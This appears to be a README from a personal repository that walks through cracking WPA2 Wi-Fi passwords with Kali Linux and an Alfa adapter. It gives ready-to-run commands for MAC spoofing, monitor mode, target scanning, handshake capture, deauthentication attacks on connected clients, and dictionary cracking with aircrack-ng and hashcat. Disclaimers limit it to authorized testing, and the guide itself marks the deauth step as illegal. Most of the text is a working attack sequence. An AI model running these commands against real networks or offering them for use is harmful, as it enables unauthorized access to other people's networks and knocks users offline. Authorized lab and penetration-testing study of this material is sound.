# WiFi_Hacking
Full walkthrough and bug solving of my expirence with alfa1900 adapter
# Wi-Fi Security Testing Guide (Using Alfa AWUS1900)

> ⚠️ **Disclaimer**  
> This guide is intended **only for ethical penetration testing and educational purposes**.  
> Do **not** attempt to capture or crack networks you don’t own or don’t have explicit written permission to test.  
> Unauthorized access to computer networks is illegal.

---

## 🔧 Overview

This walkthrough demonstrates how to capture and brute-force a WPA2 handshake **for your own lab or authorized test network** using **Kali Linux** and an **Alfa AWUS1900** adapter.

---

## 🧩 Step 1 – Verify That Kali Recognizes the Adapter

```bash
lsusb
```

#### Expected output:

```bash
#Bus 004 Device 003: ID 0bda:8813 Realtek #Semiconductor Corp. RTL8814AU 802.11a/b/g/n/ac #Wireless Adapter
```

If the adapter is not listed:

1. Shut down the VM  
2. Go to **VM Settings → USB Controller**  
3. Set **USB Compatibility → USB 3.1**  
4. Restart the VM

---

## 🧠 Step 2 – Confirm Wi-Fi Interface

```bash
iwconfig
#Expected example:
#wlan0     IEEE 802.11  ESSID:off/any  
#         Mode:Managed  Access Point: Not-Associated
```



---

## 🕵️‍♂️ Step 3 – Change Your MAC Address (Optional)

### Bring Interface Down
```bash
sudo ifconfig wlan0 down
```

### Randomize MAC
```bash
sudo macchanger -a wlan0
```


#### Expected output:
```bash
    #Current MAC:   ***** (unknown)
    #Permanent MAC: ***** (ALFA, INC.)
    #New MAC:       00:20:d5:82:0f:d2 (VIPA GMBH)
```


### Bring Interface Up
```bash
sudo ifconfig wlan0 up
```

**Useful commands:**
- `macchanger -s wlan0` – show current MAC  
- `macchanger -a wlan0` – random vendor  
- `macchanger -r wlan0` – full random  
- `macchanger -p wlan0` – restore permanent  

---

## 📡 Step 4 – Enable Monitor Mode

### Check for Interfering Processes
```bash
sudo airmon-ng check wlan0
sudo airmon-ng check kill
```

### Start Monitor Mode
```bash
sudo airmon-ng start wlan0
```

### Verify
```bash
iwconfig
#output: --> wlan0     IEEE 802.11  Mode:Monitor
```

---

## 🔍 Step 5 – Scan for Networks

```bash
sudo airodump-ng wlan0
```

Example target:

```
BSSID = ***
Channel = 11
```

---

## 🤝 Step 6 – Capture Handshake

```bash
sudo airodump-ng -c 11 --bssid *** -w handshake wlan0
```

If no handshake appears:
send de-auth packets
## warning: !illegal!
```bash
sudo aireplay-ng --deauth 10 -a *** wlan0
```

---

## 🧪 Step 7 – Verify Handshake

```bash
sudo aircrack-ng handshake-01.cap
```

---

## 🔐 Step 8 – Brute-Force the Password

```bash
sudo aircrack-ng -w passlist.txt -b *** handshake-01.cap
```

Successful example:

```
KEY FOUND! [ your_wifi_password ]
```

---

## 🧰 Optional – Hashcat (GPU Cracking)

```bash
hcxpcapngtool -o handshake.hccapx handshake-01.cap
hashcat -m 2500 handshake.hccapx /usr/share/wordlists/rockyou.txt
```

---

## 🧭 Step 9 – Restore Normal Networking

```bash
sudo airmon-ng stop wlan0
sudo systemctl restart NetworkManager
```

---

## ✅ Summary

| Stage | Purpose |
|--------|----------|
| Verify adapter | Ensure hardware and drivers work |
| Randomize MAC | Privacy & isolation |
| Monitor mode | Capture raw 802.11 frames |
| Airodump-ng | Discover APs and clients |
| Aireplay-ng | Force reconnection |
| Aircrack-ng / Hashcat | Recover PSK |

---

> 🧠 **Use responsibly** — for legal, ethical security testing only.
